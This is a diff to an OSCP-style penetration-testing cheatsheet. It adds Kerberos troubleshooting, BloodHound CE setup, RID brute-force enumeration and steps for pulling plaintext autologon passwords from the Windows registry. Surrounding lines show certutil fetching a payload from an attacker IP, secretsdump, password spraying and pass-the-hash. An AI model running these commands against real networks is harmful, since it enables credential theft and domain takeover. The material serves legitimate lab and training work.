@@ -20,6 +20,7 @@
   - [Meterpreter Session Basics](#meterpreter-session-basics)
 - [Active Directory](#active-directory)
   - [AD Enumeration](#ad-enumeration)
+    - [Kerberos Environment Setup (Troubleshooting)](#kerberos-environment-setup-troubleshooting)
   - [Credential Access](#credential-access)
   - [Lateral Movement](#lateral-movement)
   - [Privilege Escalation (AD)](#privilege-escalation-ad)
@@ -41,6 +42,7 @@
     - [Potato Attacks](#potato-attacks)
     - [AppLocker bypass](#applocker-bypass)
     - [Unattended installation files](#unattended-installation-files)
+    - [Registry Autologon Credentials](#registry-autologon-credentials)
     - [Windows Privilege Escalation Checklist](#windows-privilege-escalation-checklist)
 - [Password Cracking](#password-cracking)
   - [John the Ripper](#john-the-ripper)
@@ -533,7 +535,34 @@ certutil -urlcache -f http://<YOUR_IP>/payload.exe payload.exe
 
 Typical OSCP/lab flow: **Enumeration → Credential Access → Lateral Movement → Privilege Escalation → Persistence**
 
+> **Impacket on Kali**: scripts install as `impacket-<ToolName>` (e.g. `impacket-GetNPUsers`, `impacket-secretsdump`, `impacket-lookupsid`), not `<ToolName>.py`. This cheatsheet uses the classic `.py` names for consistency with most write-ups; if you get `command not found`, use the `impacket-` prefix instead, or clone the [Impacket repo](https://github.com/fortra/impacket) and run `python3 examples/<ToolName>.py`.
+
 ### AD Enumeration
+
+#### Kerberos Environment Setup (Troubleshooting)
+
+Kerberos is strict about name resolution and time sync — these errors show up before you even start enumerating, and they're easy to misdiagnose as credential or permission problems.
+
+* **Resolve the domain/DC locally** — AS-REP Roasting, Kerberoasting, and any Kerberos auth fail with `KDC_ERR_WRONG_REALM` if your resolver can't resolve the domain:
+
+```bash
+echo "<DC_IP> <DOMAIN.LOCAL> <DC_HOSTNAME>.<domain.local> <DC_HOSTNAME>" | sudo tee -a /etc/hosts
+```
+
+* Use the **exact** realm name and casing from `nmap`'s LDAP/Kerberos output (e.g. `Domain: EGOTISTICAL-BANK.LOCAL`) — a single wrong character (underscore instead of dash, wrong case) is enough to trigger `KDC_ERR_WRONG_REALM`
+
+* **Sync the clock with the DC** — Kerberos tickets are time-sensitive; the default tolerance is only ~5 minutes of skew:
+
+```bash
+sudo apt install ntpdate
+sudo ntpdate <DC_IP>
+```
+
+* Check skew first without syncing (also visible in `nmap`'s `smb2-time` script output as `clock-skew:`):
+
+```bash
+rdate -p <DC_IP>
+```
 
 #### BloodHound / SharpHound
 
@@ -558,12 +587,29 @@ bloodhound-python -u <username> -p '<password>' -d <domain> -ns <DC_IP> -c All
 * `-c All`: All collection methods
 * Output: JSON files for BloodHound import
 
-* **Run BloodHound GUI**:
+* **Run BloodHound GUI (legacy, local Neo4j + bloodhound packages)**:
 
 ```bash
 sudo neo4j console &    # DB at http://localhost:7474
 bloodhound &            # GUI — drag .zip or .json into Upload Data
 ```
+
+* **Run BloodHound CE (Docker — current recommended setup)** — bundles Neo4j + Postgres + web UI, no manual `neo4j`/`bloodhound` package install or version matching needed:
+
+```bash
+curl -L https://ghst.ly/getbhce -o docker-compose.yml
+sudo docker compose -f docker-compose.yml up
+```
+
+* Check containers are healthy: `sudo docker compose ps`
+* Web UI: `http://localhost:8080`
+* Get the generated admin password from the first-run logs:
+
+```bash
+sudo docker compose logs bloodhound | grep -i "initial password"
+```
+
+* Upload `.json`/`.zip` collection files the same way as the legacy GUI (drag into **File Upload**)
 
 * **Useful pre-built queries** (GUI):
   * Find all Domain Admins
@@ -633,6 +679,18 @@ nxc smb <target> -d <domain> -u <user> -p '<password>' -x "whoami"
 ```
 
 * `-x`: `cmd.exe`; `-X`: PowerShell
+
+* **RID brute force** — walks RIDs via SMB/RPC to list every account's **exact** `sAMAccountName`, even with low-priv creds. Essential when you only have a *candidate* username (e.g. a friendly name from a registry autologon, a guessed format, or a display name) and need to confirm the real AD account before testing it elsewhere:
+
+```bash
+nxc smb <DC_IP> -u <user> -p '<password>' --rid-brute
+```
+
+* Equivalent with Impacket (see also [SID Enumeration (Impacket)](#sid-enumeration-impacket) below):
+
+```bash
+lookupsid.py <domain>/<user>:'<password>'@<DC_IP>
+```
 
 #### SID Enumeration (Impacket)
 
@@ -918,6 +976,10 @@ GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
 GetUserSPNs.py <domain>/user:pass -dc-ip <DC_IP>
 secretsdump.py <domain>/user:pass@<DC_IP>
 nxc smb <DC_IP> -u users.txt -p 'Pass!' --continue-on-success
+
+# CREDENTIAL ACCESS (low-priv shell already obtained)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # autologon creds
+nxc smb <DC_IP> -u <user> -p '<password>' --rid-brute                   # confirm real sAMAccountName
 
 # LATERAL MOVEMENT
 evil-winrm -i <target> -u user -H <NT_HASH>
@@ -1234,6 +1296,21 @@ Also check other deployment paths noted by **PowerUp** under **UnattendPath** (`
 ```bash
 echo '<BASE64_STRING>' | base64 -d
 ```
+
+#### Registry Autologon Credentials
+
+* **What** — Windows can be configured to log a user in automatically at boot (`AutoAdminLogon`). When enabled, the username, domain, and **plaintext password** are stored directly in the registry — a common misconfiguration worth checking early in any Windows foothold, low-priv or not.
+
+```powershell
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+* Look for:
+  * `DefaultUserName` — may belong to a **different account** than the one you're shelled as (often a service account with elevated AD rights)
+  * `DefaultDomainName`
+  * `DefaultPassword` — plaintext
+* **Important** — `DefaultUserName` is free text set manually by whoever configured autologon; it is **not guaranteed to match the exact `sAMAccountName`** in AD (abbreviations, display names, and typos are common). Confirm the real account name before burning attempts — see [RID brute force](#netexec-crackmapexec--ad) or [SID Enumeration (Impacket)](#sid-enumeration-impacket).
+* Registry ≠ event logs — this is **configuration storage** (settings, like a hierarchical database), not a time-ordered journal; `Get-EventLog` / Event Viewer is the actual Windows logging mechanism.
 
 #### Windows Privilege Escalation Checklist
 
